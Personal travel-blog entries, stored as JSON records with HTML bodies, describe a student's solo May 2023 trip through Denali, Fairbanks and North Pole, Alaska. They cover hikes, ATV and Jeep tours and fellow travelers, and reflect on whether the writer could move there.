id=\"other-travelers\">Other Travelers</h2>\n<p>Then there are those travelers.</p>\n<ul>\n<li>2 elder women who said I reminded me of their kids on the Seward\nTour</li>\n<li>2 young women hiking a very difficult course in Lost Lakes in\nSeward, well equipped and seemed experienced</li>\n<li>An Australian elderly couple, really nice, who offered me a ride in\nSeward, the man formerly knew how to fly planes and they owned 9 acres\nof land in Australia</li>\n<li>2 travers on the Alaska railroad, one saying he is going to stay in\na small town for several weeks, then going to Vancouver, another saying\nhe is spending 2 nights in Talkeetna, and stay in Alaska for 2\nmonths</li>\n<li>2 young women sprinting down the mountains in Healy, seem\nexperienced and athletic</li>\n<li>2 elder guys, an 80-year-old guy traveling to Denali from Anchorage,\nold Alaskan from 1970s, another guy with 19-year-old grandson from\nCalifornia</li>\n<li>2 Taiwanese couple on a train, enjoying slow-paced travel and\nexclaming about beautiful views, chatting with me about the trip along\nthe way</li>\n</ul>\n<p>Well, some of them are affluent middle-aged or older travelers who\nlikely accumulated wealth in their early ages somewhere else. They\nlikely work hard or have some reliable source of income.</p>\n<p>These people are mainly nice because they are travelers(although they\nmight be very nice in real life too). When people are traveling they\ntend to be much more friendly and approachable.</p>\n<h2 id=\"ethnicity-of-alaska\">Ethnicity of Alaska</h2>\n<p>Alaska is predominantly white, with few blacks, Asians, or\nLatinos.</p>\n<p>In Anchorage museum I remembered there seeing on TV about Black\nPeople\u2019s heritage in Alaska, so there is an effort to foster\ninclusivity. But minor ethnicities have less impact than California.</p>\n<h2 id=\"computer-science-industry\">Computer Science Industry</h2>\n<p>There are very few tech companies or computer science jobs in Alaska.\nIt is so hard to find a cloud VPS in Anchorage nowadays. While the West\nCoast has so many top tech companies, from Socal to Silicon Valley to\nOregon, Seattle, and even Vancouver, Alaska just doesn\u2019t have such\nhype.</p>\n<p>Alaska is so remote that the whole coastline from Socal to Seattle is\naround the same distance as the coastline from Seattle to Anchorage,\njust to get a general idea. But I heard good things about Helsinki and\nStockholm in tech, which are also around 60 degrees of Latitude like\nAnchorage.</p>\n<p>There aren\u2019t many tech jobs in Alaska today other than writing some\nfrontend or database for small companies. Complete remote working seems\nway better.</p>\n<h2 id=\"military-culture\">Military Culture</h2>\n<p>Although I didn\u2019t personally experience it, there seemed to be a\nstrong group of military people in Alaska, and a lot of local families\nseem to come from veterans. I don\u2019t like military.</p>\n<h2 id=\"moving-there-realistic-perspectives\">Moving There: Realistic\nPerspectives</h2>\n<p>While not impossible, I see very few possibilities of moving to\nAlaska in at least the next 20 years. The most we can hope for is\nfrequent vacations or long-term stays in Alaska. Here\u2019s why.</p>\n<ul>\n<li>To move to Alaska long-term, I need to get a Green Card or Immigrate\nto the USA, which takes years</li>\n<li>To get a Green Card or Immigrate to the USA, a very realistic path\nis first finishing grad school, then going to work as an \u201cexpert\u201d for\nseveral years in some tech company, given the current situation</li>\n<li>I need to find a job to sustain myself in Alaska, and given my\nprevious years of experience, it is likely that I have an advantage in\ntech</li>\n</ul>\n<p>Most native Alaskans I met are either blue-collar workers or workers\nwith very special specifications, like commercial pilots.</p>\n<p>While not impossible, working as a \u201cdriver\u201d or \u201ctour guide\u201d after\ndecades of intensive academic training and expertise seems strange,\nfailing to utilize my strength. These tour guides don\u2019t require much\ntech knowledge beyond middle school and focus more on interaction and\nlocal familiarity, either field I don\u2019t have a strength at all.</p>\n<p>Even a \u201ccomputer science teacher\u201d at a local high school doesn\u2019t need\na PhD degree.</p>\n<p>Thus getting a stable income and suitable job becomes very hard if I\nwant to live there long-term. What\u2019s more, the cost of living is no\njoke. Homelessness in Alaska is better than in California, however, it\nis still a problem. I saw homeless camps in Cuddy Park. I saw homeless\npeople sleeping on the ground near the train station. I saw a homeless\nperson camping near UAA. I saw some homeless camps across the street at\nRob\u2019s cottage.</p>\n<h2 id=\"what-do-i-wantor-miss\">What do I want(or miss)?</h2>\n<p>I miss the laid-back atmosphere. Like you go there and there isn\u2019t\nmuch hurry or tension in the air, but exposed to natural beauty.</p>\n<p>What\u2019s more, Alaska provides a very quiet environment, away from the\nbustling and noisy cities. In Fairbanks, as I walked on the streets I\nsaw there was an RV in front of almost every house. When I walk around I\ncan find peace in my heart, and reflect quietly in my inner mind in the\nslow-paced lifestyle.</p>\n<p>Living in constant pressure is no joke, it rips the fun away from me,\nputting me in anxiety and mental health problems. I feel a great sense\nof belonging there.</p>\n", "_id": "66689633547d3fe098118744"}

I saw the broadness of nature, the beauty of glacier and huge\nsnowy mountains, melting ice and waterfalls and sliding rocks, the\nblueness of ocean and coastlines and rocky beaches, more than 30 degrees\nnorth in latitude from California, and the wildlife, bears, orcas,\nseals, and many more, that I hadn't seen much before in life. Now in the\nevening sun everything looked glamorous, and the all the places and\nsceneries I was once amazed at became dwarfed and not that interesting\nanymore. I flew in a helicopter, went on a boat cruise of 110 miles,\nhiked solo on the mountains, went on ATV and Jeep tours, saw the\nkindness of strangers. I learned to be well-prepared, to plan a trip\ncarefully, to get a car in the future to be ready for the roads and\nmountains. There are many first-times for me on this trip.</p>\n<p>One trip is hardly enough, and I quickly fell in love with Alaska,\none-sixth the size of Europe. After this trip I will return one day, and\nperhaps even choose to live here.</p>\n<p>Future places to go: Prudhoe Bay, Gates of the Arctic, Utqiagvik,\nJuneau, Ketchikan, Wasilla, Alyeska, Talkeetna, Harding Iceberg Trail,\nLost Lake</p>\n<p>I tried to book the cheapest hotels, but they are still expensive.\nThe reasons are because I travel solo while most hotel rooms are for 2\npeople and I do not have a car, so I cannot go very far and only have\nlimited selections, and couldn't sleep in a car. The most expensive one\nis airbnb in Anchorage, which was actually designed for more than 1\nperson but since I was staying only 1 night, with the cleaning fee it\nbecame expensive.</p>\n<h2 id=\"521\">521</h2>\n<p>Today is 521.</p>\n<p>I am just leaving Denali, and going to fairbanks. My trip is almost\ncoming to and end with the final destination. I am on the train, and\nfeeling quite sleepy.</p>\n<p>Today I first went on a Jeep tour. The Jeep tour was to pick me up at\nPrincess Hotel and 7 am. It was freaking early and so hard to get up and\nI got up at like 6:59 and then hurried to finish packing my things. I\nwent to the hotel lobby and I could hear the tour guide calling my name,\nand I didn't even check out or drop luggage, which I had planned to do,\nbefore leaving and going on a Jeep tour. Fortunately, though, te\ncheckout went successful.</p>\n<p>The Jeep tour is extremely expensive, like 184 dollars. Everybody got\nto drive a Jeep of their own, and those couples usually sit together,\nexcept for me, as I had to sit in the tour guide Myriam's car. Then we\ngot off to the park road.</p>\n<p>Then the tour guide explained how the rivers were all formed by\nglaciers, and salmons will die in those rivers so inland, since the\nrivers are rich with silt, which comes from glaciers, and we can judge\nhow the river flows from how brown the color is. The Park Highway went\nlike along Nenana River, the one just down Princess Hotel.</p>\n<p>Then someone saw a moose and we all slowed down, and I managed to get\nmy first picture of a moose here. Then we went to see some caribou,\nwhich is like reindeers. I saw those caribou from a binocular provided\nin the Jeeps, and there were 3 of them, eating grass. We drove on Denali\nHighway, where it turned out to be a dirt road, and to camp settlement\nand had a stop there, it seems as an entry to the mountains. Then we had\nsnacks provided by the tours. It was a spot to overlook spot where I\ncould see those snowy mountains, and the tour guide explained Denali is\nlike 18000 ft from base camp to the top, very impressive, still growing\nat .5 mm everywhere becuase of those plates clashing together.</p>\n<p>On the way back we passed some RVs, a crazy motorbiker, ATVs, and\nsome normal cars. Then I got very sleepy and slept for half an hour.\nWhen I woke up there was 2 caribous in sight. Then we went back to the\nhighway. It just seemed like a normal drive, and I ended up paying so\nmuch.</p>\n<p>Then I went back to the hotel and stored my luggage, then headed to\nthe horseshoe lake trail. The trail was a piece of cake for me and I ran\nfirst half. Then I saw a beaver's dam, and I crossed it, getting my\nshoes wet. It isn't hard to cross it, though, the trees and leaves are\nall loose. Then there was a rock cliff like in the side of the lake, and\nI attemped it twice. However, everything was loose and I couldn't even\nget past like 30 feet before feeling too dangerous to go on. Anyways, I\nam like 18 years old and don't want to risk losing my life. Then I saw\nsome road in the tundras and attemped it, and it seems smooth at first.\nHowever, there are too many dead trees falling down on the way and those\nbranches got in my face. I tried very hard to reach the other side of\nthe park road, but it was a steep climb and there was just too much tree\nbranches, so I ended up quitting it anyways. The way down is no easier\nthan the way up, and I crawled on all fours and tried to slide down the\ntundra. But there are so many dead trees and branches and mosquitos, and\nthey always flew around me. It was annoying but I managed to go down\nsafely.</p>\n<p>Then I ate some food in the restaurant Morina Grill and then went\nback to pick up my luggage. People here kind of work in all different\nstates, and many come here only for the summer, which is cool. I thought\nabout finding jobs every year in different places and it seems tough but\nfun at the same time. Then I boarded the train to Fairbanks. Denali is\nthe highest mountain in North America, and I haven't explored much of\nthis place yet before leaving it. I hadn't even gone on the denali bus\ntour or the savage river shuttle. But anyways things went fine. I slept\nhalf of the journey.</p>\n<p>I found that the land became greener and grenner as I was going\nnorth-summer was coming there first. In Seward after 500 ft or so\neverything was covered with snow, and in Denali there was only little\nsnow on top of the mountain, then as we are going to Fairbanks on this\ntrain everything seemed so green, that it didn't look like 67 degree\nnorth latitude at all. Trees are growing just everywhere, and no trace\nof snow could be seen by eyes. I thought that on the train from Shanghai\nto Hefei it was more bare than this. Then I arrived and called the hotel\nand they came pick me up.</p>\n<p>There was only me staying in Golden North Inn and the man picking me\nup was a fourth year student in University of Alaska Fairbanks, who is\nworking in the hotel. He is kind of dressed in woman's clothes and is\nvery nice. He talked about how he had only C grades and had attempted\ncomputer but failed, and I thought I was fortunate not having to work\nwhile studying. After settling into the hotel I grabbed a map and went\nright out to hike. I planned to go downtown and went along Cheny River.\nI saw a group of people who thought I was Japanese, and a woman acting\nvery strange and talking to me in words I can't understand. Anyways, I\nleft and went for downtown.</p>\n<p>It was pretty late at about 10 pm at night, and it is quite empty. I\nkept along Cheny River. I went to Pioneer Park, which seems like a\nchildren's playground, and there are some women doing bike flips, which\nseems very interesting. Then I went to Growden Park, and there are a\ngroup of people, mostly kids and teenagers, playing volleyball. Some of\nthem are half naked and barefoot they were having so much fun that I\nwished I could join. There are also some other people skateboarding\nthere in the park. It was beautiful there at night. In Denali and Seward\nmost people are tourists hiking around while in Fairbanks they seem to\nbe living normal lives. Also, the more north I traveled the hotter it\ngets. In early May, it was like 5-10 C in Seward, in Anchorage it was\nlike 10-15 C, while in Fairbanks it was like 15-20 C. Now as I look\naround the trees and mountains are deep green, and there are no signs of\nArctic weather or coldness, just spring and life everywhere.</p>\n<p>There are few people on the streets in the evening and it did get\nlonely, then I thought like hiking with another person. But then again,\nlike 2 people aren't necessarily safer, if a wolf or bear comes out and\nattack no one can escape, and I think it is just as safe hiking alone as\n2 people because I tend to be more careful when I am alone. Anyways, I\nfigured it was mostly mental support, and maybe by traveling in groups\nmakes the trip sounds more reasonable, instead of like mindlessly\nwandering, which was what I had done. I gotten so much good photos that\nI had a hard time deleting the mediocre ones.</p>\n<p>Then I went to Kiwanis Park, which is much more deserted. I walked\naround then quickly went out of the park to downtown. There is an\nelementary school and I could hear people playing in the school, and it\nwas like 10:30 pm. I thought I had gone to bed earlier than this in\nelementary school before becoming half a night owl now. Anyways, it was\na hard walk and my legs are beginning to feel sore. I could see the\nmountains and a red sun just setting down, and it looked so beautiful.\nDowntown Fairbanks looked very worn down, and there are merely a few\nbuildings, and few people. It was actually a little bit creepy, and\nthose people doesn't seem to look very decent. There was just old houses\non either side of the street. I walked to City Hall, and there wasn't\nmuch to see. Anyways, it was like 11 pm, and I was getting tired, and\nthe wind was becoming cold. I walked around a little bit more, and up to\nCheny River again. In the red setting sun the bridge was so beautiful,\nand I took some pictures, and there was a statue about WW2, and there\nwas a polaris sculpture. I saw some people sitting outside, and they are\nprobably homeless, so I wanted to go back as soon as possible, and I\ncalled a Lyft, and it came after 20 mintues. I then went back to the\nhotel.</p>\n<p>Fairbanks is much smaller than Anchorage in both population and size.\nIt is very beautiful, and a quite populated city as north as I could\nget. In less than like 40 hours I would be in Berkeley again, and my\nluxurious trip is coming to an end. I totally enjoy this trip.</p>\n<p><br />\nHorseshoe Lake<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/w7cGP3uwIl_4kspcqBH1weDncPaBOxAVo7MF7uA_y3VCDdIWTn-efKzuYT_8uU9jFFH0rRe-_cdGKtG6d-6iRj2heftIlhNr1UrxdYJvIc1w239lEYmtUPikSemoZbz8xJctmFXlLpRD92SDGAMoHEs=s800\" /><br />\n<br />\nGrowden Park<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/2jxviBLDUEnT5BW_u4-PhUsXX0-AcA7EPEC3G3gSo4WsqQTAutIbjrJ-MC2GELuOoTMV_lN9F25o4lnyA3mzs9vgOYb4NxmEi5CkpD_nCEebWvi20FiwGG5JJZEH2Jkmb-hTJw5lXojnhlWCu2bcHCU=s800\" /><br />\n<br />\nChena River<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/poDcIoo4NKU3L5mtotLq-CNkwwZIDlcyAXSiwvBz8KXq5NFUe4Gs1_X1go-Xjo6Tqu6hhPgm2ZQPDG6uTdFXSr6YgFDzFvY8fuE_PgPTLbFUi9b72WjdgF_99RdMyizSKMgcccWb7ZNJN5rRgqkius4=s800\" /><br />\n<br />\nMidnight<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/VrwrsStMMdRBBE6qsOKzM7I1ZHT-S2Kv4dPgLQrcBXGolQftQOS56oRturui-pMsRmrsQQmdKKp8iNZr2_b_oa_cZ6TuMyWtONtSXA9kMkIuIfhL3keGDtYvVzO_cuasFOOLh4p_jNtsxDy00JT484k=s800\" /><br />\n</p>\n<h2 id=\"522\">522</h2>\n<p>Today is 522 and I am leaving Alaska.</p>\n<p>I slept all morning and got up and ate breakfast at the hotel. Then I\ntook a lyft taxi to North Pole, and there was a big statue of Santa\nClaus, and the driver even helped shoot a photo of me with Santa\nClaus.</p>\n<p>Then I walked around North Pole, and it seemed a small and old town.\nI could hear a few dogs barking so I was scared. I walked around and\nthere were some parks, but the roads aren't well constructed. Then I\nwent to the North Pole elementary school, and I didn't even realize I\nwent into a school. I saw many kids, while the whole population of North\nPole is like less than 3000, so I figured that there are less than 50\nkids in one grade. Then I looked it up in the map and there was the\nelementary school. Children are climbing up and down and swinging, and\nseemed to have fun, which made me want to have fun with them, but I\nwalked away. No one stopped me from entering the school though.</p>\n<p>Then I went to a shopping mart, and rested a while, and walked to a\nbus stop, and took the bus back to Fairbanks, then took a Lyft to the\nhotel, then took the shuttle to the airport.

{"title": "Visiting Denali", "date": "Sun May 21 2023 22:23:09", "type": "alaska", "body": "<h2 id=\"519\">519</h2>\n<p>Today is 519.</p>\n<p>I stayed up very late because I was too tired I didn't feel like\nsleeping at night. I watched a few YouTube videso and organized the\nphotos I took on the previous days. But I had to get up super early,\nlike 7 am in the morning, to catch the train. I did see some homeless\nacross the street, where the house owner Rob wrote on a paper saying\n\"the Alaskan government released 300 homeless on the streets\", and how\nit had hurt his business.</p>\n<p>The cottage was so comfortable and nice that I didn't want to leave.\nIt was so big, like 2 times the normal size, and I really really loved\nit. I felt like I could stay there for years. It was kind of tearful\ngoodbye, and I left Anchorage while feeling so sleepy. Then I got on the\ntrain to Denali.</p>\n<p>The train is very slow, but there are few people on board. Some\npeople around me talked, and there is a solo traveler who would be\nspending 8 weeks here and 2 nights in Talkeetna, and there was a\nmid-aged couple who is spending 7 weeks here and then going to Vancover\nand Seattle. I kind of liked that idea but I got many things to do. The\ntour guide talked about the scenic places all along, and also said that\nthey hired high school seniors on a 11 week program to be tour guides. I\nwondered how much they can earn. An old man said to a young worker on\nthe train that he would gladly take the job had he been 50 years younger\nbecause the view is so fantastic. We got to Nancy Lake and tour guide\nsaid how people would choose to retire here. And most towns on the way\ndoesn't even have electricity. Anyways, I ended up sleeping all the way\nto nearly Talkeetna, and missed much of the views, but I was in a better\nform.</p>\n<p>The train is like 8 hours, but actually it only takes 4 hours to go\nby car. When we arrived at Talkeetna two Taiwanese, brother and sister,\nboth kind of old, got on the train, and they were speaking in mandarin\nso I went over and said hi, and we chatted in Chinese. They had no cars\nand they also took the flight yesterday, and did a glacier landing. I\ntalked about how I came from Shanghai, and I went from Seward to here,\nto which they replied, \"intersting\". They were going to Seward after\nDenali. The woman was always taking photos of the beautiful view\noutside, and exclaiming, \"beautiful, beautiful\", in mandarin with a\nstrong taiwan accent. They were also going to take the boat cruise, and\nwanted to walk in downtown, but couldn't go on any hikes because they\nare not strong enough. Then they asked what I was studying and stuff,\nand how computer science degree is good. Then we passed a beautiful\nbridge about 900 feet long and the tree opened, and there was a big\ngorge.</p>\n<p>Then I took a picture of them and they took a picture of me, and in\nthe part of the train there was only us 3 people. The train slowed down\nat some points to very spectacular views of the whole mountain, but most\ntimes there are so many trees. We even got close to the tree line, where\noutside everywhere higher than the train there was just snow and rock\nand bushes, no trees anymore. We passed some interesting lakes. Then I\nfell asleep again.</p>\n<p>Anyways we arrived at Denali at 4 pm, and I got in the shuttle to the\nhotel, and ate at a subway. I went across the street to book an ATV tour\nand a Jeep tour, then I ate at a subway. Then I got a stomachache and\nfelt bad for 3 hours. Then the grade for computer security was released,\nand it turns out wasn't good, but wasn't as bad as I expected. I\nwondered how I managed to get above average scores on those hard classes\neven after doing almost nothing for a whole semester, and how I\nconstantly struggled with my coursework even after studying really hard.\nSometimes it seems like working hard at all from the perspective of\ngrades or results, that everything is just the way it is. If I feel like\ndoing something I accomplish it, no matter if I actually put in effort\nor not, while if I don't I just can't, and no matter how hard I worked\nthe result doesn't change at all. Only thing I can do is choose what to\ndo, for example, choose which course to study, choose between going on a\ntrip or studying or watching YouTube. Then I thought that I should have\nput all my time into running and climbing mountains and going out\nsightseeing, and how I couldn't accept the fact if I am doing that right\nnow but maybe I could be doing that after completing the degrees and\nimmigrating to Alaska or Switzerland or whatever. However, I looked up\nUniversity of Alaska Anchorage's computer science and it didn't appear\nin csrankings, and turned out to be like number 249, which is like\npretty bad. That was so unfortunate for me.</p>\n<p>Then I decided to call it a day since it was pretty late, and I am\ntired and can't do anything else. Denali looked like a tourism\ndestination while Seward is like normal town, where there are actually\npeople living there. Everywhere in Denali there is just tours, hotels,\nrestaurants, etc.</p>\n<h3 class=\"photos2\" id=\"photos2\">Photos</h3>\n<p><br />\nAnchorage-&gt;Denali<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/ofS4I1EU3bxY0sLG0KovE-YllGY8i876Q2p-ae6OCgpTCG86m_GI7LZJGpi1Tcm3On47phQ79L77e_uHx2T7dlFN-N3zZo7phWqjSkgQLWTQy-EUTk89MQOIFsZLBgygSYwQgqcgoFaKDsuMpESXovg=s800\" /><br />\n<br />\nGorge<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/wRc999efr8exGYb9wZFsx9umI8XwqYsLjwqYN-YFMjnqC1BjElpDw8S5LcqgNmWQShv_JHuQv8nWcExO2i0W2Wn5vPVU1a0cv_5XMyQLekyusbE53kbpfiVABl6bm_5sAbHBdS7q36d_AS84T6_BHK0=s800\" /><br />\n<br />\nMe on the Train<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/ZffwCrXFZagwjO-YtBmFL2cucZDUHcyI8tjus-VaI8o-VWweoVJhvPUbMpkP8i5wYJtMALUw3FJ2XFmOZy0fxdopT40uBg-ciD_YEua6ixoxqBqnmozBLeDpZJeoAmR_eU7s5nknius4hO6FOu4GTXA=s800\" /><br />\n<br />\nMirror Lake<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/oS36mJ-PFLXsz8Nl5uaYxy98cOv_qQWJhE4ezwg-zaMmW0XoTo41yQDWEfKsTsbl_6opkgcdaxmMizo_GUSZd1EK7QrGGgy8FjN4vBZC8frQIUnR9l5gDmg-seRGBz8k7lpb-HsNv2yaRpmquuzcBXU=s800\" /><br />\n</p>\n<h2 id=\"520\">520</h2>\n<p>Today is 520, and it is already a week since I arrived in Alaska, how\ntime flies!</p>\n<p>I slept all morning. Then I went for a hike, but I didn't know where\nto hike. My stomach hurt yesterday so I didn't have lunch and breakfast,\nand I went hiking without like anyfood, but it felt fine anyways. I went\non the hotel shuttle bus to Denali visitor center, and there was 4 old\npeople on it with me. One of them said he is 80 years old, and another\nsaid his grandson is 19 years old, and how he had moved to Anchorage in\nlike 1970s, around the time my parents were born. Anyways, we chatted a\nbit, and they were from California and Anchorage. Then I thought about\nhow they would be like a young boy like me 50 years ago. Then I thought\nabout how precious time is, that I should be spending my time doing the\nthing that is truly worth it, then one flick of a second later I would\nbe old as hell, and not able to walk anymore or whatever, and my stay in\nthis world is short, so I think I should do the thing I want now that I\nam in my prime and not leave things to do when I am old. Then I went on\nMount Healy Trail. The trail is much easier than the trails in Seward,\nand the road is clear and not steep. There is 1700 ft elevation gain. I\nalmost run up the trails, and it got so hot that I was sweating, even in\nshort sleeves. There are no snow on the ground, and I thought how much\neasier it is. There are tens of people going up the trail, and we all\nwaved hi as we went past each other. Then the road became steeper, and\nthe view opened up, and I could see mountains, but there are snows only\non top. Denali melts faster than Seward, where above like 500 ft\neverything was covered with snow. The mud is wet everywhere, and I\nreckoned it is the melting snow, but I don't see any snow until to the\nvery top. The wind is very strong, and it got quite dangerous after the\nend of mount healy trail. I was also almost out of water so I turned\nback. I felt quite energetic at the top of the mountain, then run down\nthe mountain. There are two women who was also running, and they passed\nme as they were running even faster. Then I went back and got water and\nwent on Rock Creek Trail.</p>\n<p>However, Rock Creek Trail is not worth it, just like a walk in the\npark. I walked very quickly, and went to Denali Park headquarters. But\nthere are few people, so I turned back. The trail turned out not to be\nshort, like 4 miles round trip, and it took me quite a lot of time, like\n1.5 hours. I decide to go back to hotel since it became late, and my\nlegs are a little sore. I think if I had woken up earlier I could've\nhiked more. Then I thought that the mountains in Hefei are a piece of\ncake, and how well constructed the roads were. I could go up and down 3\ntimes easily now. I figured it would feel strange to sleep before\nnighttime back in California.</p>\n<p>Then I went on an ATV tour. The bus driver picked me up at Princess\nHotel, and all the way to an ATV station. The driver said he was from\nColorado, and went to all states except Hawaii, which he hopes to make\nit in his 50th birthday, and that it was his 2nd year in Alaska.\nAnyways, he is very humorous and interesting. I thought what a life that\nwould be. The bus driver also said that the place to drive ATV is not in\nDenali National Park, since it is illeagal, instead, it is like 10\nsquare mile range separated from the park. Then we got off the bus.</p>\n<p>The ATV tour guides first introduced and talked about the rules, that\nwe shouldn't stop or shoot photos or do those front flips, or we will be\nremoved. The tour guides were called Rico and Stefan, They talked about\nhow we need to follow the next car for a reasonable distance, so that we\ncan see headlights and not get too close. It was my first time driving\nanything, and I was like the only person without driver's license. I sat\ninside the ATV, and the tour guide said we were only supposed to press\nbreak and acceleration and the wheel. Then we started to go up the\nmountain, and I felt very nervous indeed. Anyways, everything went on\nsmoothly, and I was able to drive easily. The tour then slowed down and\ntold me to stick on the same side as him as we would be passing other\ntours on the other side, and I followed.</p>\n<p>The road was very bumpy, and the ATV seemed to go over anything, like\nrocks, pebbles, and muds with melted snow. I tried very hard to balance,\nbut since the roads were full of ups and downs, the ATV went tumbling\nall the time, but it was still pretty smooth. The wheels doesn't turn\nreally well, so sometimes when the tour in the front made a sharp turn I\nhad to go through some bushes to catch up. We went at a reasonable pace,\nfast enough but also very safe from any collisions.</p>\n<p>Then we came to a scenic view and we stopped, then Stefan talked a\nlittle about the mountains and lakes around. Stefan said it was like 10\nhour hike up Mount Healy, and that the small town under there had 800\npeople in winter and 5000 in summer, since winter is -50 degrees. I was\nimpressed how fast the ATV drive was, and in just minutes we drove up so\nhigh up. I would be so much more tired if I hike up here, though.</p>\n<p>Then we went to a shallow river with a big sandcastle, and we stopped\nfor like 15 minutes. Rico and Stefan joked that they had come at 2 am to\nbuild it together. Then they explained that it was formed by erosion,\nand there are sands sliding down as we were talking. The lake was called\ndry creek, and they also explained that the river can travel anywhere,\nand they were formed by erosion of rocks, and how on every different\ntours the river would seem different, and how a landslide just came a\nfew years ago and blocked the river, filling everything with dead trees.\nI asked if I could possibly climb the sand-rock thing, and they said it\nwas too dangerous. Then they also picked up a few pebbles, and explained\nhow there might be jewels or gold in those rocks, and showed us how to\nmake clay as ancient people, using a redish rock to carve on another. I\ntouched the water and it was icy cold. The tour guides said we could\ndrive over the river but the other tourists were very scared and thought\nit dangerous. In the middle evening sun everything looked so\nglamorous.</p>\n<p>Rico and Stefan they came from Miami, and they said Miami was perfect\nin winter. Rico said that there are a really good highway in San\nFrancisco to drive, and there was just ocean, mountain, and you. Then he\nsaid he had been to everything in the lower 48 states, so he ended up\nhere in Alaska, which is the only place he had not yet explored. I said\nI wanted to go to Miami, and I thought that I was already planning my\nnext trip to Miami, Palm Beach, Fort Lauderdale, and Key West. The two\nother visitors said they were impressed how I could drive like that\nwithout a license. The guides also talked about fishing, and how they\nwould catch 10 big fish in an hour and get enough fish for a whole year\ndown in the Otto Lake. Anyways I could feel myself much more adventurous\nand tough without my parents around, and I felt young and energetic. I\nsaid the hike in Seward is much harder than the hike in Mount Healy, and\nthe guide said my shoes aren't right for hiking, and they had those long\nboots for fisherman, which goes over mud while I was wearing Nike\nPegasus, which is like distance running shoes, but they seemed all right\nfor hiking without snow, though.</p>\n<p>By the end of the day I was driving like it is something I do every\nday in my life, and it felt so good coming down the dusty trail. The ATV\nwas sliding but it is very safe. The guides said those ATVs can go\nacross anything, like bushes, and they can go all the way to the top of\nthe mountain. I saw those big horses on the way back, and the two horse\nin the front was leading a carriage filled with people. The tour guide\nwaved and the horses and carriages moved to one side, allowing me to\ndrive past on the other side.</p>\n<p>The tour guides are so nice that I ended up giving all my 5 dollar\nchange to them. But then I thought that they were only nice because I\npaid so much, and strangers are usually casual. Anyways, I am using my\nparent's money, so I am spending a lot, so they are nice to me because\nthey want good reviews so they can get more money. I would feel much\nbetter if I earned all the money myself. Then I checked up the price of\nRV, and they were very expensive, like the Minnie Winnie I hitchhiked on\nactally cost like 250 dollars one night, which is more expensive than a\nhotel room, but they were for a group. Then I thought maybe next time I\nwould be traveling with wife or girlfriend or something, but I don't\nhave and girls may not be hiking with me for 10 hours everyday and they\nare always very hard to understand, so it would be much harder for me so\nI would probably be traveling solo anyways. I thought about driving\naround the Alaska, going to Homer, Seward, Alyeska, Talkeetna, Healy,\nPrudhoe Bay in my RV, and it sounds so cool and I could do so many hikes\nevery day and sleep and get up whenever I want. Anyways, I don't think I\ncan do that. Then I thought about staying a few more days, as I don't\nwant to leave, but this trip is luxurious enough, and few people could\nafford 9 days in Alaska anyways. I thought about living here after\ngetting appropriate degrees or something and it looked pretty good if I\nhad a stable income. From every perspective Alaska is much better than\nBerkeley, while Shanghai and Hefei and just too crowded, and although I\ndon't think that is too bad, I kind of lived there for almost 20 years\nand want to try something different for couple of years maybe.</p>\n<p>Anyways, I didn't realize that it was 930, and the 2.5 hours passed\nso fast. On the drive back the driver got on the left shoulder of the\nhighway, which is illegal in Alaska, hoping to spot a wild anyway, but\nmoose didn't came out. Then we spotted two Dall Sheep on the mountain.\nThen we got back to the hotel.</p>\n<p>Then I went on a gift shop and bought 2 t-shirts, and the staff was\nreally friendly, and then I got really hungry, probably becuase I hadn't\neaten lunch and had a small dinner, so I got like few snacks for me.\nDenali is merely a tourist attraction, but it is very beautiful\nindeed.</p>\n<h3 class=\"photosafas2\" id=\"phsdfsaf\">Photos</h3>\n<p><br />\nMount Healy Trail<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/iAP3UDHlkL5-xZ_acegfJIKYejrJu5zhGqevFWbEoNxOuaamhyZDO73-BvoGwE4whS6bbsZML80WPvVYHqYd5xPNBw2GhCi15Q0Ikc-C6uoeXUsBEKod3MnovHisbEZ2yZrlpC4PFvvSoKDRtQGQ7YE=s800\" /><br />\n<br />\nRock Creek Trail<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/ceCUweubRB14dzQNq1XHcacIQA0H6UCUqRTfaBAx_8Dt82dF-dhxJmowqc3PZs91RONB9l-DuyyLgqjhC2FvWwMKZMdoX0TXMgkmtlPm9Mv6fsrIjDG-IRp1_nNo6reHquTjB3jXHABQx7eNWMHbO7U=s800\" /><br />\n<br />\nATV<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/AASebsDB2QiXgtoEzyzxGGX-BxKs1x4z57pWSbqB0jjDb7w-vR2wq8NcXck7w3a6-XR5TZwBKNfd2uk_ooF3VeMoQEYH4TJhkATSUvG2cg9VncI7jNm89IrG8VJhv_OD5tj2X0R6GacaekeSHnMPgtc=s800\" /><br />\n<br />\nDry Creek<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/HszviEs9k6Zg-idO51b2XcbJWk2gQ4wx_1bzn-x4rcbZUO8uXYkq_dL5ssc6j_vdD2zx50tiTnOOQuWjTV6QIrvxGEH-v5yUVAp5Qd78TLZ8beODqYFVPLHbqgXYPtPyR1Huy0GTWKbmRisK8UwhzEc=s800\" /><br />\n</p>\n", "_id": "66689633547d3fe098118746"}
